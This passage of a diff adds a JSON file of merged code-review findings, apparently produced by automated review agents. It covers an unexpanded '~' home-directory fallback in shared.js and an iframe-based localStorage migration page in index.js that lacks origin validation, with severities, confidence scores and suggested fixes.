+    "suggestion": "Deduplicate keyDecisions before returning them in the API response (by timestamp + tool name), or use a Set-like structure for tool call tracking during parsing. At minimum, cap the array size before serializing to JSON."
+  },
+  {
+    "merged_id": "M-025",
+    "canonical_title": "Config file paths use ~ which path.join does not resolve on Windows",
+    "canonical_severity": "P3 MEDIUM",
+    "canonical_description": "The fallback path ~ in process.env.HOME || process.env.USERPROFILE || '~' — on Windows, HOME is not usually set, and if USERPROFILE is somehow unset, the fallback '~' will be passed to path.join and fs operations. Node.js path.join does not expand ~ to the home directory; it treats it as a literal directory name. This would create a directory named ~ in the current working directory and store sensitive config data there, potentially in a world-readable location.",
+    "category": "security",
+    "file": "shared.js",
+    "line_range": [
+      4,
+      8
+    ],
+    "sources": [
+      {
+        "agent": "B",
+        "finding_id": "B-015",
+        "severity": "suggestion",
+        "unified_severity": "P3 MEDIUM",
+        "title": "Config file paths use ~ which path.join does not resolve on Windows",
+        "description": "The fallback path ~ in process.env.HOME || process.env.USERPROFILE || '~' — on Windows, HOME is not usually set, and if USERPROFILE is somehow unset, the fallback '~' will be passed to path.join and fs operations. Node.js path.join does not expand ~ to the home directory; it treats it as a literal directory name. This would create a directory named ~ in the current working directory and store sensitive config data there, potentially in a world-readable location.",
+        "confidence": 0.75,
+        "category": "security",
+        "rule_reference": "CWE-377: Insecure Temporary File"
+      }
+    ],
+    "consensus": {
+      "base_confidence": 0.75,
+      "consensus_boost": 0.0,
+      "final_confidence": 0.75,
+      "agent_count": 1
+    },
+    "status": "single_source",
+    "conflicts": {
+      "severity_conflict": false,
+      "severity_gap": 0,
+      "category_conflict": false,
+      "categories": [
+        "security"
+      ]
+    },
+    "code_snippet_bad": "var homeDir = process.env.HOME || process.env.USERPROFILE || \"~\";",
+    "code_snippet_good": "var os = require(\"os\");\nvar homeDir = process.env.HOME || process.env.USERPROFILE || os.homedir();",
+    "suggestion": "Use os.homedir() from the os module as the ultimate fallback instead of '~'. This is guaranteed to return the correct home directory on all platforms."
+  },
+  {
+    "merged_id": "M-026",
+    "canonical_title": "/migrate endpoint uses iframe to load data from port 3100 without origin validation",
+    "canonical_severity": "P2 HIGH",
+    "canonical_description": "The localStorage migration page creates an iframe pointing to http://localhost:3100/ and reads its content via ifr.contentDocument.body.textContent. This is a cross-origin access that only works because both are on localhost (same origin). If port 3100 ever hosts malicious content (e.g., another process hijacks that port), the migration page would read and import attacker-controlled data into localStorage. The page also uses a 500ms setTimeout to wait for iframe load, which is a fragile timing assumption.",
+    "category": "security",
+    "file": "index.js",
+    "line_range": [
+      55,
+      62
+    ],
+    "sources": [
+      {
+        "agent": "B",
+        "finding_id": "B-016",
+        "severity": "nit",
+        "unified_severity": "P2 HIGH",
+        "title": "/migrate endpoint uses iframe to load data from port 3100 without origin validation",
+        "description": "The localStorage migration page creates an iframe pointing to http://localhost:3100/ and reads its content via ifr.contentDocument.body.textContent. This is a cross-origin access that only works because both are on localhost (same origin). If port 3100 ever hosts malicious content (e.g., another process hijacks that port), the migration page would read and import attacker-controlled data into localStorage. The page also uses a 500ms setTimeout to wait for iframe load, which is a fragile timing assumption.",
+        "confidence": 0.72,
+        "category": "security",
+        "rule_reference": "CWE-923: Improper Restriction of Communication Channel to Intended Endpoints"
+      }
+    ],
+    "consensus": {
+      "base_confidence": 0.72,
+      "consensus_boost": 0.0,
+      "final_confidence": 0.72,
+      "agent_count": 1
+    },
+    "status": "single_source",
+    "conflicts": {
+      "severity_conflict": false,
+      "severity_gap": 0,
+      "category_conflict": false,
+      "categories": [
+        "security"
+      ]
+    },
+    "suggestion": "Add explicit validation of the imported data structure before writing to localStorage. Verify that the data is a flat key-value object of strings. Use a postMessage-based communication channel instead of iframe contentDocument access for more explicit origin control."
+  }
+]
